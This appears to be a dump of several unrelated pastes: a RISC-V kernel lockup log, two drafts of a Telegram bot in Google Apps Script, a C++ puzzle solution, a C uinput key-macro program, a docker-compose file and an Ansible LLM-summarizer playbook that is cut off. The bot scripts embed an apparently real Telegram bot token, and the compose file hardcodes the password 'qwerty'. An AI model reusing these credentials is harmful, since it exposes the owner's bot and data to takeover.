[  378.408381] task:swapper/52      state:R  running task     stack:0     pid:0     ppid:1      flags:0x00000000
[  378.418291] Call Trace:
[  378.420734] [<ffffffff80c642b2>] __schedule+0x312/0x8e8
[  378.425957] Task dump for CPU 53:
[  378.429269] task:swapper/53      state:R  running task     stack:0     pid:0     ppid:1      flags:0x00000000
[  378.439178] Call Trace:
[  378.441622] [<ffffffff80c642b2>] __schedule+0x312/0x8e8
[  378.446844] Task dump for CPU 57:
[  378.450155] task:swapper/57      state:R  running task     stack:0     pid:0     ppid:1      flags:0x00000000
[  378.460064] Call Trace:
[  378.462507] [<ffffffff80c642b2>] __schedule+0x312/0x8e8
[  378.467730] Task dump for CPU 60:
[  378.471042] task:swapper/60      state:R  running task     stack:0     pid:0     ppid:1      flags:0x00000000
[  378.480951] Call Trace:
[  378.483395] [<ffffffff80c642b2>] __schedule+0x312/0x8e8
[  378.488617] Task dump for CPU 61:
[  378.491929] task:swapper/61      state:R  running task     stack:0     pid:0     ppid:1      flags:0x00000000
[  378.501839] Call Trace:
[  378.504283] [<ffffffff80c642b2>] __schedule+0x312/0x8e8
[  378.509506] Task dump for CPU 63:
[  378.512817] task:swapper/63      state:R  running task     stack:0     pid:0     ppid:1      flags:0x00000000
[  378.522727] Call Trace:
[  378.525170] [<ffffffff80c642b2>] __schedule+0x312/0x8e8
[  378.530393] rcu: rcu_sched kthread timer wakeup didn't happen for 6122 jiffies! g31669 f0x0 RCU_GP_WAIT_FQS(5) ->state=0x402
[  378.541601] rcu:     Possible timer handling issue on cpu=16 timer-softirq=278
[  378.548556] rcu: rcu_sched kthread starved for 6123 jiffies! g31669 f0x0 RCU_GP_WAIT_FQS(5) ->state=0x402 ->cpu=16
[  378.558895] rcu:     Unless rcu_sched kthread gets sufficient CPU time, OOM is now expected behavior.
[  378.567844] rcu: RCU grace-period kthread stack dump:
[  378.572890] task:rcu_sched       state:I stack:0     pid:16    ppid:2      flags:0x00000000
[  378.581237] Call Trace:
[  378.583681] [<ffffffff80c642b2>] __schedule+0x312/0x8e8
[  378.588904] [<ffffffff80c648d6>] schedule+0x4e/0xd0
[  378.593778] [<ffffffff80c6a420>] schedule_timeout+0x82/0x132
[  378.599435] [<ffffffff80095648>] rcu_gp_fqs_loop+0x312/0x40a
[  378.605093] [<ffffffff80098d40>] rcu_gp_kthread+0x116/0x1a0
[  378.610663] [<ffffffff8003ed1e>] kthread+0xbc/0xd2
[  378.615452] [<ffffffff80003c9c>] ret_from_exception+0x0/0x16
[  378.621107] rcu: Stack dump where RCU GP kthread last ran:
[  378.626587] Task dump for CPU 16:
[  378.629898] task:swapper/16      state:R  running task     stack:0     pid:0     ppid:1      flags:0x00000000
[  378.639807] Call Trace:
[  378.642251] [<ffffffff80c642b2>] __schedule+0x312/0x8e8
[  396.308374] watchdog: BUG: soft lockup - CPU#14 stuck for 75s! [StreamTrans #13:2137]
[  396.316203] Modules linked in: vfat fat rfkill snd_hda_codec_hdmi snd_hda_intel snd_intel_dspcfg snd_hda_codec snd_hda_core snd_hwdep ofc
[  396.346657] CPU: 14 PID: 2137 Comm: StreamTrans #13 Tainted: G             L     6.1.31 #1
[  396.354915] Hardware name: Sophgo Mango (DT)
[  396.359180] epc : _raw_spin_lock+0x42/0x80
[  396.363277]  ra : __handle_mm_fault+0xe2a/0x122a
[  396.367893] epc : ffffffff80c6b8e4 ra : ffffffff801f8d42 sp : ffffffc82a5f3d50
[  396.375108]  gp : ffffffff81e76cc8 tp : ffffffd9041e9f40 t0 : ffffffe042c73000
[  396.382324]  t1 : fffffff6df89e640 t2 : 0000000000000000 s0 : ffffffc82a5f3d60
[  396.389538]  s1 : ffffffd90a4c7308 a0 : ffffffdfe1f1b1e8 a1 : 000000000010c6c7
[  396.396753]  a2 : ffffffd7fde00000 a3 : 00fffffffffff000 a4 : 000000000000039f
[  396.403968]  a5 : 0000000003a1039b a6 : 0000000000000001 a7 : 0000000000000014
[  396.411183]  s2 : ffffffd904bc5c80 s3 : ffffffe7ded39c80 s4 : 700000021139c8d7
[  396.418398]  s5 : ffffffe7ded39c80 s6 : ffffffd905395000 s7 : ffffffff8173c1f8
[  396.425613]  s8 : 0000000000000255 s9 : 0000000000000001 s10: 0000003facc614e0
[  396.432829]  s11: 0000000000000392 t3 : 7000000000000000 t4 : 0000000000000080
[  396.440044]  t5 : 0000000000000000 t6 : ffffffc82a5f3df0
[  396.445350] status: 0000000200000120 badaddr: 0000000000000000 cause: 8000000000000005
[  396.453260] [<ffffffff80c6b8e4>] _raw_spin_lock+0x42/0x80
[  400.310375] watchdog: BUG: soft lockup - CPU#5 stuck for 78s! [Timer:2090]
[  400.310377] watchdog: BUG: soft lockup - CPU#10 stuck for 78s! [StreamTrans #4:2126]
[  400.317250] Modules linked in: vfat fat
[  400.324989] Modules linked in:
[  400.324990]  rfkill snd_hda_codec_hdmi snd_hda_intel
[  400.328825]  vfat
[  400.331874]  snd_intel_dspcfg snd_hda_codec
[  400.336833]  fat
[  400.338755]  snd_hda_core snd_hwdep
[  400.342932]  rfkill snd_hda_codec_hdmi
[  400.344768]  ofpart snd_pcm
[  400.348252]  snd_hda_intel
[  400.351994]  sophgo_spifmc spi_nor
[  400.354784]  snd_intel_dspcfg
[  400.357487]  snd_timer joydev
[  400.360884]  snd_hda_codec snd_hda_core
[  400.363848]  mtd gpio_dwapb
[  400.366811]  snd_hwdep
[  400.370641]  snd r8169
[  400.373432]  ofpart snd_pcm
[  400.375788]  soundcore uio_pdrv_genirq
[  400.378145]  sophgo_spifmc
[  400.380934]  uio loop
[  400.384678]  spi_nor snd_timer
[  400.387381]  ip_tables amdgpu
[  400.389650]  joydev
[  400.392699]  gpu_sched drm_buddy
[  400.395663]  mtd
[  400.397758]  drm_ttm_helper ttm
[  400.400982]  gpio_dwapb
[  400.402817]  spi_dw_mmio spi_dw
[  400.405954]  snd r8169
[  400.408396]  drm_display_helper cec
[  400.411534]  soundcore
[  400.413889] 
[  400.413893] CPU: 5 PID: 2090 Comm: Timer Tainted: G             L     6.1.31 #1
[  400.417372]  uio_pdrv_genirq
[  400.419727] Hardware name: Sophgo Mango (DT)
[  400.419731] epc : _raw_spin_lock+0x42/0x80
[  400.421216]  uio loop
[  400.428515]  ra : __handle_mm_fault+0x680/0x122a
[  400.431392]  ip_tables amdgpu
[  400.435656] epc : ffffffff80c6b8e4 ra : ffffffff801f8598 sp : ffffffc82a48bd50
[  400.439746]  gpu_sched drm_buddy
[  400.442015]  gp : ffffffff81e76cc8 tp : ffffffd922f73e80 t0 : 0000003faca2f000
[  400.446626]  drm_ttm_helper
[  400.449589]  t1 : 0000000000000000 t2 : 0000000000000002 s0 : ffffffc82a48bd60
[  400.456802]  ttm spi_dw_mmio
[  400.460024]  s1 : 0000000000000004 a0 : ffffffdfe1f1b1e8 a1 : 0000000000000020
[  400.467237]  spi_dw
[  400.470025]  a2 : 000000000431b1c0 a3 : 0000000000000021 a4 : 00000000000003a0
[  400.477237]  drm_display_helper cec
[  400.480113]  a5 : 0000000003a1039b a6 : ffffffd8ffcdb200 a7 : 0000003faccfefff
[  400.487327] 
[  400.489422]  s2 : 0000000000000000 s3 : ffffffd904bc5c80 s4 : 0000000000000255
[  400.496635] CPU: 10 PID: 2126 Comm: StreamTrans #4 Tainted: G             L     6.1.31 #1
[  400.500116]  s5 : 0000000000100073 s6 : ffffffd905395000 s7 : ffffffff8173c1f8
[  400.507329] Hardware name: Sophgo Mango (DT)
[  400.508817]  s8 : 0000000000000255 s9 : 0000000000000001 s10: 0000003faccf2584
[  400.516030] epc : _raw_spin_lock+0x42/0x80
[  400.524195]  s11: 00000000000000d3 t3 : 0000000000000000 t4 : 0000003faccf256c
[  400.531408]  ra : __handle_mm_fault+0xe2a/0x122a
[  400.535671]  t5 : ffffffd8ffcdb20c t6 : ffffffc82a48bdf0
[  400.542883] epc : ffffffff80c6b8e4 ra : ffffffff801f8d42 sp : ffffffc82a5a3d50
[  400.546973] status: 0000000200000120 badaddr: 0000000000000000 cause: 8000000000000005
[  400.554185]  gp : ffffffff81e76cc8 tp : ffffffd904e19f40 t0 : ffffffe03cf52000
[  400.558796] [<ffffffff80c6b8e4>] _raw_spin_lock+0x42/0x80
[  400.564100]  t1 : 00000000000f0000 t2 : 0000000000000000 s0 : ffffffc82a5a3d60
[  400.599029]  s1 : ffffffd90a4c7308 a0 : ffffffdfe1f1b1e8 a1 : 000000000010c6c7
[  400.606245]  a2 : ffffffd7fde00000 a3 : 00fffffffffff000 a4 : 000000000000039c
[  400.613460]  a5 : 0000000003a1039b a6 : 0000000000000000 a7 : 0007ffffffffffff
[  400.620675]  s2 : ffffffd904bc5c80 s3 : ffffffe7debc5440 s4 : 700000020fc544d7
[  400.627889]  s5 : ffffffe7debc5440 s6 : ffffffd905395000 s7 : ffffffff8173c1f8
[  400.635105]  s8 : 0000000000000255 s9 : 0000000000000001 s10: 0000003facc614e0
[  400.642320]  s11: 000000000000038c t3 : 7000000000000000 t4 : 0000000000000080
[  400.649535]  t5 : 0000000000000000 t6 : ffffffc82a5a3df0
[  400.654841] status: 0000000200000120 badaddr: 0000000000000000 cause: 8000000000000005
[  400.662750] [<ffffffff80c6b8e4>] _raw_spin_lock+0x42/0x80"
tTZCWU1g,Untitled,RPengo,JavaScript,Saturday 8th of July 2023 06:50:17 PM CDT,"var token = ""6310496713:AAFc1ZBL1rDDtlWphvgPs_akc_VtL4w-lkU"";
var telegramUrl = ""https://api.telegram.org/bot"" + token;
var webAppUrl = ""https://script.google.com/macros/s/AKfycbyj_k4agwj9VB0C7x03phUocRB9uzJCricuRSmK3UIn4UnKenJ53ruICit5-rRW7SHHCA/exec"";

function doGet() {
  return HtmlService.createHtmlOutput(""Olá"");
}

function setWebhook() {
  var url = telegramUrl + ""/setWebhook?url="" + webAppUrl;
  var response = UrlFetchApp.fetch(url);
}

function sendText(chatId, text, keyBoard) {
  var data = {
    method: ""post"",
    payload: {
      method: ""sendMessage"",
      chat_id: String(chatId),
      text: text,
      parse_mode: ""HTML"",
      reply_markup: JSON.stringify(keyBoard)
    }
  };
  UrlFetchApp.fetch(telegramUrl + ""/"", data);
}


function updateMenus(sheetName) {
  var ssIdsoja = ""1Wz6ClfsG2Vxxptlvx626SxRvm4bVf3f5_T9vj3ehxzU"";
  var ssIdmilho = ""1XLSUfdBhoiiHljfQwOiChHAqPYALuG8enUw_3J7jrDY"";
  var ssIdalgodao = """";
  var ssIdSorgo = """";
  var activeSheet = SpreadsheetApp.openById(ssIdsoja).getSheetByName(sheetName);
  var range = activeSheet.getRange(""A2:A15"");
  var values = range.getValues();

  var menuOptions = values.map(function(row) {
    return row[0];
  });

  menuOptions.push(""Voltar""); // Adiciona a opção ""Voltar"" à lista de opções do menu

  var keyboard = {
    ""keyboard"": chunkArray(menuOptions, 3),
    resize_keyboard: true,
    one_time_keyboard: true
  };

  return {
    keyboard: keyboard,
    expenseSheet: activeSheet
  };
}

function chunkArray(array, size) {
  var result = [];
  for (var i = 0; i < array.length; i += size) {
    result.push(array.slice(i, i + size));
  }
  return result;
}



function doPost(e) {
  var contents = JSON.parse(e.postData.contents);
  var userProperties = PropertiesService.getUserProperties();
  var ssIdsoja = ""1Wz6ClfsG2Vxxptlvx626SxRvm4bVf3f5_T9vj3ehxzU"";
  var ssIdmilho = ""1XLSUfdBhoiiHljfQwOiChHAqPYALuG8enUw_3J7jrDY"";
  var ssIdalgodao = """";
  var ssIdSorgo = """";
  var expenseSheets = [
  ""A"", ""B"", ""C"", ""D"", ""E"", ""F"", ""G"", ""H"", ""I"", ""J"", ""K"", ""L"", ""M"", ""N"", ""O"", ""P"", ""Q"", ""R"", ""S"", ""T"", ""U"", ""V"", ""W"", ""X"", ""Y"", ""Z""
];

var keyBoard = {
  ""keyboard"": [
    [""Soja"", ""Milho""],
    [""Algodão"", ""Sorgo""]
  ],
  resize_keyboard: true,
  one_time_keyboard: true
};

var keyBoardSoja = {
  ""keyboard"": chunkArray(expenseSheets, 4).map(function(row, index, array) {
    if (index === array.length - 1) {
      return row.concat([""Voltar""]);
    }
    return row;
  }),
  resize_keyboard: true,
  one_time_keyboard: true
};

var keyBoardMilho = {
  ""keyboard"": chunkArray(expenseSheets, 4).map(function(row, index, array) {
    if (index === array.length - 1) {
      return row.concat([""Voltar""]);
    }
    return row;
  }),
  resize_keyboard: true,
  one_time_keyboard: true
};

var keyBoardAlgodao = {
  ""keyboard"": chunkArray(expenseSheets, 4).map(function(row, index, array) {
    if (index === array.length - 1) {
      return row.concat([""Voltar""]);
    }
    return row;
  }),
  resize_keyboard: true,
  one_time_keyboard: true
};

var keyBoardSorgo = {
  ""keyboard"": chunkArray(expenseSheets, 4).map(function(row, index, array) {
    if (index === array.length - 1) {
      return row.concat([""Voltar""]);
    }
    return row;
  }),
  resize_keyboard: true,
  one_time_keyboard: true
};

function chunkArray(array, size) {
  var result = [];
  for (var i = 0; i < array.length; i += size) {
    result.push(array.slice(i, i + size));
  }
  return result;
}



  if (contents.message) {
    var chatId = contents.message.chat.id;
    var id_message = contents.message.chat.id;
    var text = contents.message.text;
    var firstName = contents.message.from.first_name;

    if (text === '/menu') {
      sendText(id_message, ""Olá "" + firstName + "", selecione uma opção:"", keyBoard);
    } else if (text === 'Soja') {
      sendText(chatId, ""Selecione uma opção:"", keyBoardSoja);
    } else if (text === 'Voltar') {
      sendText(id_message, ""Selecione uma opção:"", keyBoard);
    } else if (text.length === 1 && text.charCodeAt(0) >= 65 && text.charCodeAt(0) <= 90) {
      var result = updateMenus(text);
      sendText(id_message, ""Selecione uma opção:"", result.keyboard);
      userProperties.setProperty(""sheet"", result.expenseSheet.getSheetName());
    } else {
      var sheetName = userProperties.getProperty(""sheet"");
      if (sheetName) {
        var expenseSheet = SpreadsheetApp.openById(ssIdsoja).getSheetByName(sheetName);
        var menuOptions = expenseSheet.getRange(""A2:A15"").getValues().flat();
        if (menuOptions.includes(text)) {
          var rowIndex = menuOptions.indexOf(text) + 2;
          var value = expenseSheet.getRange(""B"" + rowIndex).getValue();
          sendText(id_message, decodeURI(value), { parse_mode: 'HTML' });
        } else {
          sendText(id_message, ""Olá "" + firstName + "", selecione uma opção:"", keyBoard);
        }
      } else {
        sendText(id_message, ""Olá "" + firstName + "", selecione uma opção:"", keyBoard);
      }
    }
  }
}"
auFiUSei,Untitled,RPengo,JavaScript,Saturday 8th of July 2023 06:47:55 PM CDT,"var token = ""6310496713:AAFc1ZBL1rDDtlWphvgPs_akc_VtL4w-lkU"";
var telegramUrl = ""https://api.telegram.org/bot"" + token;
var webAppUrl = ""https://script.google.com/macros/s/AKfycbwuF4CBwR9_qkxaocRTHcPDeBLre5UcxYOl7zeTEp6zFpBjducvIV7f4spSEbU_-3cs0Q/exec"";

function doGet() {
  return HtmlService.createHtmlOutput(""Olá"");
}

function setWebhook() {
  var url = telegramUrl + ""/setWebhook?url="" + webAppUrl;
  var response = UrlFetchApp.fetch(url);
}

function sendText(chatId, text, keyBoard) {
  var data = {
    method: ""post"",
    payload: {
      method: ""sendMessage"",
      chat_id: String(chatId),
      text: text,
      parse_mode: ""HTML"",
      reply_markup: JSON.stringify(keyBoard)
    }
  };
  UrlFetchApp.fetch(telegramUrl + ""/"", data);
}


function updateMenus(sheetName) {
  var ssIdsoja = ""1Wz6ClfsG2Vxxptlvx626SxRvm4bVf3f5_T9vj3ehxzU"";
  var ssIdmilho = ""1XLSUfdBhoiiHljfQwOiChHAqPYALuG8enUw_3J7jrDY"";
  var ssIdalgodao = """";
  var ssIdSorgo = """";
  var activeSheet = SpreadsheetApp.openById(ssIdsoja).getSheetByName(sheetName);
  var range = activeSheet.getRange(""A2:A15"");
  var values = range.getValues();

  var menuOptions = values.map(function(row) {
    return row[0];
  });

  menuOptions.push(""Voltar""); // Adiciona a opção ""Voltar"" à lista de opções do menu

  var keyboard = {
    ""keyboard"": chunkArray(menuOptions, 3),
    resize_keyboard: true,
    one_time_keyboard: true
  };

  return {
    keyboard: keyboard,
    expenseSheet: activeSheet
  };
}

function chunkArray(array, size) {
  var result = [];
  for (var i = 0; i < array.length; i += size) {
    result.push(array.slice(i, i + size));
  }
  return result;
}



function doPost(e) {
  var contents = JSON.parse(e.postData.contents);
  var userProperties = PropertiesService.getUserProperties();
  var ssIdsoja = ""1Wz6ClfsG2Vxxptlvx626SxRvm4bVf3f5_T9vj3ehxzU"";
  var ssIdmilho = ""1XLSUfdBhoiiHljfQwOiChHAqPYALuG8enUw_3J7jrDY"";
  var ssIdalgodao = """";
  var ssIdSorgo = """";




  
  
  var opcao = contents.message.text;
  
  if (opcao == ""Soja"") { 
  var activeSheet = SpreadsheetApp.openById(ssIdsoja).getSheetByName(sheetName); 
  } 
  else if (opcao == ""Milho"") { 
  var activeSheet = SpreadsheetApp.openById(ssIdmilho).getSheetByName(sheetName); 
  }

  var menuOptions = updateMenus(sheetName);
  
  var expenseSheets = [
  ""A"", ""B"", ""C"", ""D"", ""E"", ""F"", ""G"", ""H"", ""I"", ""J"", ""K"", ""L"", ""M"", ""N"", ""O"", ""P"", ""Q"", ""R"", ""S"", ""T"", ""U"", ""V"", ""W"", ""X"", ""Y"", ""Z""
];

var keyBoard = {
  ""keyboard"": [
    [""Soja"", ""Milho""],
    [""Algodão"", ""Sorgo""]
  ],
  resize_keyboard: true,
  one_time_keyboard: true
};

var keyBoardSoja = {
  ""keyboard"": chunkArray(expenseSheets, 4).map(function(row, index, array) {
    if (index === array.length - 1) {
      return row.concat([""Voltar""]);
    }
    return row;
  }),
  resize_keyboard: true,
  one_time_keyboard: true
};

var keyBoardMilho = {
  ""keyboard"": chunkArray(expenseSheets, 4).map(function(row, index, array) {
    if (index === array.length - 1) {
      return row.concat([""Voltar""]);
    }
    return row;
  }),
  resize_keyboard: true,
  one_time_keyboard: true
};

var keyBoardAlgodao = {
  ""keyboard"": chunkArray(expenseSheets, 4).map(function(row, index, array) {
    if (index === array.length - 1) {
      return row.concat([""Voltar""]);
    }
    return row;
  }),
  resize_keyboard: true,
  one_time_keyboard: true
};

var keyBoardSorgo = {
  ""keyboard"": chunkArray(expenseSheets, 4).map(function(row, index, array) {
    if (index === array.length - 1) {
      return row.concat([""Voltar""]);
    }
    return row;
  }),
  resize_keyboard: true,
  one_time_keyboard: true
};

function chunkArray(array, size) {
  var result = [];
  for (var i = 0; i < array.length; i += size) {
    result.push(array.slice(i, i + size));
  }
  return result;
}



  if (contents.message) {
    var chatId = contents.message.chat.id;
    var id_message = contents.message.chat.id;
    var text = contents.message.text;
    var firstName = contents.message.from.first_name;

    if (text === '/menu') {
      sendText(id_message, ""Olá "" + firstName + "", selecione uma opção:"", keyBoard);
    } else if (text === 'Soja') {
      sendText(chatId, ""Selecione uma opção:"", keyBoardSoja);
    } else if (text === 'Voltar') {
      sendText(id_message, ""Selecione uma opção:"", keyBoard);
    } else if (text.length === 1 && text.charCodeAt(0) >= 65 && text.charCodeAt(0) <= 90) {
      var result = updateMenus(text);
      sendText(id_message, ""Selecione uma opção:"", result.keyboard);
      userProperties.setProperty(""sheet"", result.expenseSheet.getSheetName());
    } else {
      var sheetName = userProperties.getProperty(""sheet"");
      if (sheetName) {
        var expenseSheet = SpreadsheetApp.openById(ssIdsoja).getSheetByName(sheetName);
        var menuOptions = expenseSheet.getRange(""A2:A15"").getValues().flat();
        if (menuOptions.includes(text)) {
          var rowIndex = menuOptions.indexOf(text) + 2;
          var value = expenseSheet.getRange(""B"" + rowIndex).getValue();
          sendText(id_message, decodeURI(value), { parse_mode: 'HTML' });
        } else {
          sendText(id_message, ""Olá "" + firstName + "", selecione uma opção:"", keyBoard);
        }
      } else {
        sendText(id_message, ""Olá "" + firstName + "", selecione uma opção:"", keyBoard);
      }
    }
  }
}"
gNYe6mzF,Untitled,Skos_Martren,C++,Saturday 8th of July 2023 06:36:31 PM CDT,"class Solution {

  bool perfectSquare(int n) { 
    int sq = round(sqrt(n)); 
    return sq * sq == n;
  }

  int numSquares(int n, int rem) {
    assert(rem >= 1);
    
    if (perfectSquare(n)) {return 1;}
    
    if (rem == 1) {return 5;}
    
    int ans = 5;
    for (int first = 1; first * first <= n; first++) {
      ans = min(ans, 1 + numSquares(n - first * first, rem - 1));
    }

    return ans;
  }
public:

  int numSquares(int n) {
    return numSquares(n, 4);
  }
};"
pFqYbTtj,keys,j0h,C,Saturday 8th of July 2023 05:24:08 PM CDT,"#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <linux/uinput.h>
#include <string.h>
 void Akey(int fd,  struct uinput_user_dev uidev){
	 int dtime=200000; //in ms
	 //A hold D*3 L K J* 2 K L relese A

    // Simulate pressing and releasing the 'A' key
    struct input_event event;
    memset(&event, 0, sizeof(event));

    event.type = EV_KEY;
    event.code = KEY_A;
    event.value = 1;  // Pressing the key
    write(fd, &event, sizeof(event));

    event.type = EV_SYN;
    event.code = SYN_REPORT;
    event.value = 0;
    write(fd, &event, sizeof(event));
/////////////D1///////////////////////
    event.type = EV_KEY;
    event.code = KEY_D;
    event.value = 1;  // Pressing the key
    write(fd, &event, sizeof(event));

    event.type = EV_SYN;
    event.code = SYN_REPORT;
    event.value = 0;
    write(fd, &event, sizeof(event));
    usleep(dtime/2);
        event.type = EV_KEY;
    event.code = KEY_D;
    event.value = 0;  // Releasing the key
    write(fd, &event, sizeof(event));

    event.type = EV_SYN;
    event.code = SYN_REPORT;
    event.value = 0;
    write(fd, &event, sizeof(event));
      usleep(dtime/2);
    ///////////D1////////////////
    /////////////D2///////////////////////
    event.type = EV_KEY;
    event.code = KEY_D;
    event.value = 1;  // Pressing the key
    write(fd, &event, sizeof(event));

    event.type = EV_SYN;
    event.code = SYN_REPORT;
    event.value = 0;
    write(fd, &event, sizeof(event));
    usleep(dtime/2);
        event.type = EV_KEY;
    event.code = KEY_D;
    event.value = 0;  // Releasing the key
    write(fd, &event, sizeof(event));

    event.type = EV_SYN;
    event.code = SYN_REPORT;
    event.value = 0;
    write(fd, &event, sizeof(event));
      usleep(dtime/2);
    ///////////D2////////////////////
    /////////D3///////////////////////
    event.type = EV_KEY;
    event.code = KEY_D;
    event.value = 1;  // Pressing the key
    write(fd, &event, sizeof(event));

    event.type = EV_SYN;
    event.code = SYN_REPORT;
    event.value = 0;
    write(fd, &event, sizeof(event));
    usleep(dtime/2);
        event.type = EV_KEY;
    event.code = KEY_D;
    event.value = 0;  // Releasing the key
    write(fd, &event, sizeof(event));

    event.type = EV_SYN;
    event.code = SYN_REPORT;
    event.value = 0;
    write(fd, &event, sizeof(event));
      usleep(dtime/2);
    ///////////D3////////////////
    /////////////L///////////////////////
    event.type = EV_KEY;
    event.code = KEY_L;
    event.value = 1;  // Pressing the key
    write(fd, &event, sizeof(event));

    event.type = EV_SYN;
    event.code = SYN_REPORT;
    event.value = 0;
    write(fd, &event, sizeof(event));
    usleep(dtime);
        event.type = EV_KEY;
    event.code = KEY_L;
    event.value = 0;  // Releasing the key
    write(fd, &event, sizeof(event));

    event.type = EV_SYN;
    event.code = SYN_REPORT;
    event.value = 0;
    write(fd, &event, sizeof(event));
      usleep(dtime);
    ///////////L////////////////
        /////////////K///////////////////////
    event.type = EV_KEY;
    event.code = KEY_K;
    event.value = 1;  // Pressing the key
    write(fd, &event, sizeof(event));

    event.type = EV_SYN;
    event.code = SYN_REPORT;
    event.value = 0;
    write(fd, &event, sizeof(event));
    usleep(dtime);
        event.type = EV_KEY;
    event.code = KEY_K;
    event.value = 0;  // Releasing the key
    write(fd, &event, sizeof(event));

    event.type = EV_SYN;
    event.code = SYN_REPORT;
    event.value = 0;
    write(fd, &event, sizeof(event));
      usleep(dtime);
    ///////////K////////////////
        /////////////J///////////////////////
    event.type = EV_KEY;
    event.code = KEY_J;
    event.value = 1;  // Pressing the key
    write(fd, &event, sizeof(event));

    event.type = EV_SYN;
    event.code = SYN_REPORT;
    event.value = 0;
    write(fd, &event, sizeof(event));
    usleep(dtime);
        event.type = EV_KEY;
    event.code = KEY_J;
    event.value = 0;  // Releasing the key
    write(fd, &event, sizeof(event));

    event.type = EV_SYN;
    event.code = SYN_REPORT;
    event.value = 0;
    write(fd, &event, sizeof(event));
      usleep(dtime*2);
    ///////////J////////////////
            /////////////J///////////////////////
    event.type = EV_KEY;
    event.code = KEY_J;
    event.value = 1;  // Pressing the key
    write(fd, &event, sizeof(event));

    event.type = EV_SYN;
    event.code = SYN_REPORT;
    event.value = 0;
    write(fd, &event, sizeof(event));
    usleep(dtime);
        event.type = EV_KEY;
    event.code = KEY_J;
    event.value = 0;  // Releasing the key
    write(fd, &event, sizeof(event));

    event.type = EV_SYN;
    event.code = SYN_REPORT;
    event.value = 0;
    write(fd, &event, sizeof(event));
      usleep(dtime*2);
    ///////////J////////////////
            /////////////K///////////////////////
    event.type = EV_KEY;
    event.code = KEY_K;
    event.value = 1;  // Pressing the key
    write(fd, &event, sizeof(event));

    event.type = EV_SYN;
    event.code = SYN_REPORT;
    event.value = 0;
    write(fd, &event, sizeof(event));
    usleep(dtime);
        event.type = EV_KEY;
    event.code = KEY_K;
    event.value = 0;  // Releasing the key
    write(fd, &event, sizeof(event));

    event.type = EV_SYN;
    event.code = SYN_REPORT;
    event.value = 0;
    write(fd, &event, sizeof(event));
      usleep(dtime*2);
    ///////////K////////////////
        /////////////L///////////////////////
    event.type = EV_KEY;
    event.code = KEY_L;
    event.value = 1;  // Pressing the key
    write(fd, &event, sizeof(event));

    event.type = EV_SYN;
    event.code = SYN_REPORT;
    event.value = 0;
    write(fd, &event, sizeof(event));
    usleep(dtime);
        event.type = EV_KEY;
    event.code = KEY_L;
    event.value = 0;  // Releasing the key
    write(fd, &event, sizeof(event));

    event.type = EV_SYN;
    event.code = SYN_REPORT;
    event.value = 0;
    write(fd, &event, sizeof(event));
      usleep(dtime);
    ///////////L////////////////
    usleep(200000);  // Delay in microseconds

    event.type = EV_KEY;
    event.code = KEY_A;
    event.value = 0;  // Releasing the key
    write(fd, &event, sizeof(event));

    event.type = EV_SYN;
    event.code = SYN_REPORT;
    event.value = 0;
    write(fd, &event, sizeof(event));
	 }

int main() {
	sleep(5); // gimme a sec to start this sht
    int fd = open(""/dev/input/by-path/platform-i8042-serio-0-event-kbd"", O_WRONLY | O_NONBLOCK);

    if (fd < 0) {
        perror(""Failed to open /dev/input/by-path/platform-i8042-serio-0-event-kbd"");
        return 1;
    }
//system(""helm"");
//A hold D*3 L K J* 2 K L relese A
    // Create the virtual input device
    struct uinput_user_dev uidev;
    memset(&uidev, 0, sizeof(uidev));
    strncpy(uidev.name, ""Virtual Keyboard"", UINPUT_MAX_NAME_SIZE);
    uidev.id.bustype = BUS_VIRTUAL;
    uidev.id.vendor = 0x1234;
    uidev.id.product = 0x5678;
    uidev.id.version = 1;

    write(fd, &uidev, sizeof(uidev));
    ioctl(fd, UI_DEV_CREATE);

  // Enable keyboard events
    ioctl(fd, UI_SET_EVBIT, EV_KEY);
    for (int keycode = KEY_ESC; keycode <= KEY_SLASH; keycode++) {
        ioctl(fd, UI_SET_KEYBIT, keycode);
    }
 //   system(""helm"");
Akey(fd, uidev);

    ioctl(fd, UI_DEV_DESTROY);
    close(fd);

    return 0;
}
"
qzDxQRNb,Untitled,_MIMBOL_,YAML,Saturday 8th of July 2023 05:16:32 PM CDT,"version: '3'

services:
  nginx:
    image: nginx:1.13
    ports:
      - 80:80
    volumes:
      - ./src:/usr/share/nginx/html
      - ./nginx.conf:/etc/nginx/nginx.conf
    depends_on:
      - php

  php:
    build:
      dockerfile: ./Dockerfile
    volumes:
      - ./src:/usr/share/nginx/html
      - ./php.ini:/usr/local/etc/php/php.ini
    depends_on:
      - mariadb
  mariadb:
    image: mariadb:10.3
    volumes:
      - ./mariadb:/var/lib/mysql
    environment:
      MYSQL_ROOT_PASSWORD: qwerty

  phpmyadmin:
    image: phpmyadmin/phpmyadmin
    links:
      - mariadb:db
    ports:
      - 8765:80
    environment:
      MYSQL_ROOT_PASSWORD: qwerty
    depends_on:
      - mariadb"
fU50CqCu,File summarizer,thehunmonkgroup,YAML,Saturday 8th of July 2023 04:53:21 PM CDT,"---
# file-summarizer.yaml
- name: Summarize the contents of all files in a directory
  hosts: localhost
  vars:
    user_id: 1
    preset: ""gpt-4-chatbot-responses""
    content_directory: ""/tmp/file-content""
    content_max_length: 22000
    summaries_directory: ""/tmp/file-summaries""
    question_1: ""Can you give me a very clear explanation of the core assertions, implications, and mechanics elucidated in this paper?""
    question_2: ""Can you explain the value of this in basic terms? Like you're talking to a CEO. So what? What's the bottom line here?""
    question_3: ""Can you give me an analogy or metaphor that will help explain this to a broad audience.""
  tasks:
    - name: Find all files in the content directory
      find:
        paths: ""{{ content_directory }}""
        recurse: yes
        file_type: file
      register: files_to_summarize

    - name: Process each file
      include_tasks: file-summarizer-summarize-file.yaml
      loop: ""{{ files_to_summarize.files }}""
      loop_control:
        loop_var: current_file
...

---
# file-summarizer-summarize-file.yaml
- name: Check if summary file exists
  stat:
    path: ""{{ summaries_directory }}/{{ current_file.path | basename }}.summarize.txt""
  register: summary_file

- block:
    - name: ""Extract text from file: {{ current_file.path }}, max length: {{ content_max_length }}""
      text_extractor:
        path: ""{{ current_file.path }}""
        max_length: ""{{ content_max_length }}""
      register: extracted_text

    - name: ""Ask first question: {{ question_1 }}""
      lwe_llm:
        preset: ""{{ preset }}""
        user: ""{{ user_id }}""
        system_message: ""{{ extracted_text.content }}""
        message: ""{{ question_1 }}""
      register: response_1
      until: ""response_1 is not failed""
      retries: 10
      delay: 3

    - name: First answer
      debug:
        msg: ""{{ response_1.response }}""

    - name: ""Ask second question: {{ question_2 }}""
      lwe_llm:
        preset: ""{{ preset }}""
        user: ""{{ user_id }}""
        conversation_id: ""{{ response_1.conversation_id }}""
